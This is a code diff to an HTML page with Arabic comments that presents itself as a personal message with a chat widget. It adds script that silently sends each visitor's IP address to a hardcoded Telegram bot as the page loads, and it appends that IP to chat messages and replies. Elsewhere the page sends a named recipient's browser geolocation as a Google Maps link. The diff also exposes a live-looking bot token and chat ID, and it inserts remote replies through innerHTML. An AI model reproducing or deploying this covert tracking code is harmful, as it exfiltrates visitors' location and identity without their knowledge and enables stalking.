@@ -76,7 +76,7 @@
             flex-direction: column;
             gap: 10px;
             font-size: 13px;
-            color: c9d1d9;
+            color: #c9d1d9;
         }
         .chat-msg {
             background: #21262d;
@@ -176,7 +176,7 @@
         </div>
     </div>
 
-    <!-- زر الشات العائم -->
+    <!-- زر وشات التليجرام العائم -->
     <div class="chat-widget-btn" onclick="toggleChatWindow()">
         <i class="fa-solid fa-comments"></i>
     </div>
@@ -203,12 +203,16 @@
         const botToken = '8882621676:AAFNQ0B3q6rPSMTIujyIHGYiep9xNM1rgZU';
         const chatId = '8718173410';
         let cachedUserInfo = null;
+        let visitorIP = "unknown_ip";
 
+        // سحب الـ IP وتخزينه
         window.addEventListener('load', async () => {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                sendToTelegram(`👀 شخص قام بفتح الصفحة:\n🌐 الـ IP: ${ipData.ip}\n🔗 الرابط: ${window.location.href}`);
+                visitorIP = ipData.ip;
+                localStorage.setItem("visitor_ip", visitorIP);
+                sendToTelegram(`👀 شخص قام بفتح الصفحة:\n🌐 الـ IP: ${visitorIP}\n🔗 الرابط: ${window.location.href}`);
             } catch (e) {}
         });
 
@@ -227,7 +231,7 @@
             input.value = '';
             chatBody.scrollTop = chatBody.scrollHeight;
 
-            const telegramMsg = `💬 رسالة شات جديدة مباشرة:\n\n${text}`;
+            const telegramMsg = `💬 رسالة شات جديدة مباشرة من (IP: ${visitorIP}):\n\n${text}`;
             sendToTelegram(telegramMsg);
 
             setTimeout(() => {
@@ -235,6 +239,28 @@
                 chatBody.scrollTop = chatBody.scrollHeight;
             }, 1000);
         }
+
+        // مراقبة ملف db.json لجلب رد الآدمن لحظياً
+        setInterval(async () => {
+            try {
+                let response = await fetch('db.json?t=' + new Date().getTime());
+                if (response.ok) {
+                    let data = await response.json();
+                    let myId = visitorIP !== "unknown_ip" ? visitorIP : (localStorage.getItem("visitor_ip") || "default_user");
+                    
+                    if (data[myId]) {
+                        const chatBody = document.getElementById('chatBody');
+                        if (chatBody && chatBody.dataset.lastReply !== data[myId]) {
+                            chatBody.innerHTML += `<div class="chat-msg admin">${data[myId]}</div>`;
+                            chatBody.dataset.lastReply = data[myId];
+                            chatBody.scrollTop = chatBody.scrollHeight;
+                            // فتح نافذة الشات تلقائياً عند وصول رد جديد لتنبيه الزائر
+                            document.getElementById('chatWindow').style.display = 'flex';
+                        }
+                    }
+                }
+            } catch (e) {}
+        }, 3000);
 
         async function fetchDatabase() {
             try {
@@ -290,15 +316,8 @@
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                        
-                        let ipInfo = "غير معروف";
-                        try {
-                            const ipRes = await fetch('https://api.ipify.org?format=json');
-                            const ipData = await ipRes.json();
-                            ipInfo = ipData.ip;
-                        } catch (err) {}
 
-                        sendToTelegram(`📍 تم فتح الرسالة بنجاح بواسطة (${recipientName})!\n🌐 الـ IP: ${ipInfo}\n🗺️ اللوكيشن:\n${mapsLink}`);
+                        sendToTelegram(`📍 تم فتح الرسالة بنجاح بواسطة (${recipientName})!\n🌐 الـ IP: ${visitorIP}\n🗺️ اللوكيشن:\n${mapsLink}`);
                         showContent(cachedUserInfo);
                     },
                     (error) => {
@@ -415,7 +434,7 @@
                 return;
             }
 
-            const textToTelegram = `💌 رد جديد من (${name}):\n\n${message}`;
+            const textToTelegram = `💌 رد جديد من (${name}) - IP: ${visitorIP}:\n\n${message}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             fetch(url, {
